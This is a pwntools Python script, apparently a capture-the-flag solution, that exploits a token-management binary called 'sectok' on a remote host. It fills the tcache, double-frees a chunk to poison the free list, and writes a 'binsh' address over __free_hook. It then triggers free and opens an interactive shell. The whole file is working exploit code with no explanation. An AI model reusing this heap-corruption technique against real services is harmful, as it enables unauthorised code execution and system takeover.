from pwn import *
import os
import sys
import time

elf = ELF('./sectok')

#access = remote('192.168.191.61',10101)
access= remote('10.21.232.3',10101)
access.sendlineafter("What is your 4-letter name? ",'PQRS')

def generate_token(): 
	access.sendlineafter("Action: ", 'g')  
	access.sendlineafter("token: ", 'PQRS')  
def remove_token(id):
	access.sendlineafter("Action: ", 'd')  
	access.sendlineafter("token: ", str(id).encode())  

for i in range(9):
    generate_token()

for i in range(7):
    remove_token(i)

remove_token(7)
remove_token(8)
remove_token(7)

terminal_shell = elf.symbols['binsh']
free_hook = elf.symbols['__free_hook']

for i in range(7):
    generate_token() 

access.sendlineafter("Action: ", 'g')  
access.sendlineafter("token: ", p64(free_hook))

generate_token()
generate_token()

access.sendlineafter("Action: ", 'g')  
access.sendlineafter("token: ", p64(terminal_shell))

#log.info('Terminal Shell Address ' + hex(terminal_shell))

remove_token(2)
access.interactive()

